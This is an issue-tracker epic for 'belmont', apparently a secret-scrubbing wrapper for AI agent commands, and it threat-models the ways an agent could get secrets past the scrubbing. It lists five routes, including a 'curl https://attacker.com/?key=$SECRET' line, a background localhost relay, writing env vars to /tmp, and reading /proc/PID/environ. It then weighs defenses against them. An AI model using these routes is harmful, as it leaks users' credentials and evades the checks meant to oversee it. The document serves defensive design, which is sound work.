---
title: "belmont: hardening — exfiltration paths and defense-in-depth"
status: discovery
priority: 2
assignee:
labels: [belmont, security, epic]
depends_on: []
created: 2026-03-24T12:52:43Z
updated: "2026-03-24T12:52:51Z"
---

## Problem

Belmont's primary defense (PTY output scrubbing) protects one path: secret
values appearing in stdout/stderr of commands run through `belmont run`. But
an agent with secrets in its subprocess environment has multiple exfiltration
paths that bypass scrubbing entirely:

### Known exfiltration paths

1. **File write + Read tool.** `belmont run -- sh -c 'echo $SECRET > /tmp/x'`
   then read `/tmp/x` with the Read tool. The secret enters context unscrubbed
   because the Read tool doesn't go through belmont.

2. **Network exfiltration.** The subprocess can make outbound HTTP requests
   containing secret values. `curl https://attacker.com/?key=$SECRET` or
   similar. No scrubbing applies to network traffic.

3. **Background process relay.** Agent starts a background process inside
   `belmont run` that listens on a local port, dumps env vars to stdout on
   connection. Then in a separate Bash call (outside belmont), curls localhost
   and reads the response. The secret passes through a non-belmont channel.

4. **Environment inspection.** `belmont run -- env` or `belmont run -- printenv`
   dumps all env vars including secrets. These get scrubbed by belmont, but
   `belmont run -- env > /tmp/vars` writes them to disk unscrubbed.

5. **Process listing.** On some systems, `/proc/PID/environ` exposes the
   environment of running processes. A separate Bash call could read it.

### The fundamental constraint

`op run` has the same limitation. Once secret values exist in a subprocess's
environment, the subprocess can write them anywhere. The PTY only controls
what the *caller* sees on stdout/stderr. This is inherent to the env-var
injection model.

### Defense layers to consider

- **Prime text hardening.** Make the "don't read files that might contain
  secrets" instruction more specific and forceful.
- **PostToolUse scanning.** Scan Bash and Read tool responses for known
  secret values. Can't prevent the leak (output is already in context) but
  can warn and educate. Cost: resolving secrets on every hook fire (~100-250ms
  for keyring lookups). Concern: false positives on short/common values.
- **Minimum secret length.** Refuse to scrub values shorter than N characters
  to avoid garbled output and false positive scans.
- **Network isolation.** Sandbox the subprocess to prevent outbound network
  calls. The microsandbox direction (see shelved tisket). This is the only
  defense against path (2) but adds significant complexity.
- **Tmpfile scrubbing.** Use a tmpdir overlay or monitor for the subprocess
  so files it writes are cleaned up before the agent can read them.
- **Accept the risk.** Document the limitation clearly. The agent is running
  locally under the human's permission model — if the agent is adversarial,
  secrets in env vars are the least of the problems.

### Sub-issues

- gjnv — file exfiltration path
- gshb — secrecy/zeroize for in-memory values
- 31nq — minimum secret length
